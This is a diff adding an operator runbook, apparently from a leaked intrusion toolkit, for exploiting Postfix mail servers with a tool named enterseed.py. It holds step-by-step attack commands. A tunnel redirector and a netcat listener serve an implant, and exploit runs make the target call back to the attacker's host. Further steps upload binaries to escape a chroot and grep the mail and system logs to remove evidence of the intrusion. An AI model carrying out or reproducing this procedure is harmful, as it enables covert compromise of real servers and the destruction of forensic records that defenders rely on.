@@ -1,0 +1,124 @@
+        ### ENTERSEED
+
+        ### Set up variables.  Use the next section for reference.
+
+        ## Description          Typical Value           Actual Value This OP
+        ## ---------------      -------------           --------------------
+        ## local-ip:                                    LOCAL_IP
+        ## pitch-ip:            192.148.167.2           PITCH_IP
+        ## target-ip:           195.210.0.50            TARGET_IP
+        ## target-name:         mail                    HOST_NAME
+        ## target-domain:       swix.ch                 DOMAIN_NAME
+        ## netcat-port:         random                  random14390-63432-21
+        ## nstun-port:          random                  random14390-63432-23
+        ## rat-port:            random                  random14390-63432-22
+
+        # Make the changes here.  Use the above for reference if you need it.
+
+mx
+:%s/LOCAL_IP/LOCAL_IP/g
+:%s/PITCH_IP/PITCH_IP/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/HOST_NAME/HOST_NAME/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+:%s/DOMAIN_NAME/DOMAIN_NAME/g
+:%s/WORK_DIR/WORK_DIR/g
+`x
+
+
+## Set up redirector
+-tunnel
+l 2500 TARGET_IP 25
+r NETCAT_PORT 127.0.0.1 NETCAT_PORT
+
+## set up a netcat listener in a local scripted window
+## to upload a STATICALL COMPILED NOPEN
+nc -l -v -p NETCAT_PORT < noserver-static
+
+## run exploit in a local scripted window
+#Usage: ./enterseed.py <target-ip> <target-port> <callback-ip> <callback-port> <platform> [-search<scale>] [-u<valid-username>] [-fuploaded-filename]
+#Platforms       1: SuSE 9.0 RPM (postfix-2.0.14-41)
+#                2: SuSE 9.1 RPM (postfix-2.0.19_20040312-11)
+#                3: ASP Linux 9 RPM (postfix-2.0.8-1asp)
+
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 1
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 1 -uroot@TARGET_IP
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 2
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 2 -uroot@TARGET_IP
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 3 -uroot@TARGET_IP -search1
+ 
+## once the exploit calls back and nopen uploaded connect to noserver
+-nstun TARGET_IP
+
+## check to see if you are chroot'd
+-lt /
+
+## if it looks like 
+#drwx------    2 postfix  root         4096 Apr 27 04:35 2003 corrupt
+#drwx-wx---    2 postfix  postdrop     4096 Apr 27 04:35 2003 maildrop
+#drwx------    2 postfix  root         4096 Apr 27 04:35 2003 saved
+#drwxr-xr-x    3 root     root         4096 Nov 17 07:22 2004 usr
+#drwxr-xr-x   18 root     root         4096 Nov 17 07:22 2004 .
+#drwxr-xr-x    2 root     root         4096 Nov 17 07:22 2004 lib
+#drwx------    2 postfix  root         4096 Nov 17 07:22 2004 hold
+#drwxr-xr-x   26 root     root         4096 Nov 17 07:36 2004 ..
+#drwxr-xr-x    2 root     root         4096 Nov 18 12:54 2004 etc
+#drwx------   18 postfix  root         4096 Nov 18 14:50 2004 active
+#drwx------   18 postfix  root         4096 Nov 18 14:50 2004 bounce
+#drwx------   18 postfix  root         4096 Dec  1 12:37 2004 deferred
+#drwx------    3 postfix  root         4096 Dec  1 14:53 2004 flush
+#drwxr-xr-x    2 root     root         4096 Dec  1 14:53 2004 pid
+#drwx------   15 postfix  root         4096 Dec  8 14:00 2004 defer
+#drwx------    2 postfix  root         4096 Mar  4 15:34 2005 private
+#drwx--x---    2 postfix  postdrop     4096 Mar  4 15:34 2005 public
+#drwxrwxrwx   19 postfix  root         4096 Mar  7 11:36 2005 incoming
+## this means you are in a chrooted environment without any binaries
+## (no ls, netstat, ps, which, w, ...)
+
+## IF NOT CHROOTED, continue to clean logs
+
+## IF CHROOTED 
+-cd incoming
+
+-put /current/up/h h
+-put /current/up/b b
+-put /current/up/s s
+-put /current/up/noserver ncd
+
+## change permissions
+./s h
+./s b
+./s ncd
+./s .
+
+## run break chroot routines
+./h
+
+## you should be able to connect to a new nopen running
+-nstun TARGET_IP 32755
+
+## CLEANUP
+## the location of the chrooted environment was /var/spool/postfix/
+-lt /var/spool/postfix/
+-lt /var/spool/postfix/incoming
+
+-rm b h s ncd a..
+
+## CLEAN LOGS
+## check logs /var/log/mail* /var/adm/mail* /var/log/messages /var/adm/messages
+grep "stripping too many comments" /var/adm/mail*
+grep "stripping too many comments" /var/log/mail*
+grep "signal 11" /var/log/mail*
+grep "signal 11" /var/adm/mail*
+grep "bogus file" /var/adm/mail*
+grep "bogus file" /var/log/mail*
+grep "writable by everyone" /var/adm/mail*
+grep "writable by everyone" /var/log/mail*
+grep PITCH_IP /var/log/messages
+grep PITCH_IP /var/adm/messages
+
+## if any of the directories or files were changed to world writable
+## change them back because postfix will panic
+chmod PREV_PERM /var/spool/postfix/incoming
+
+## ENJOY
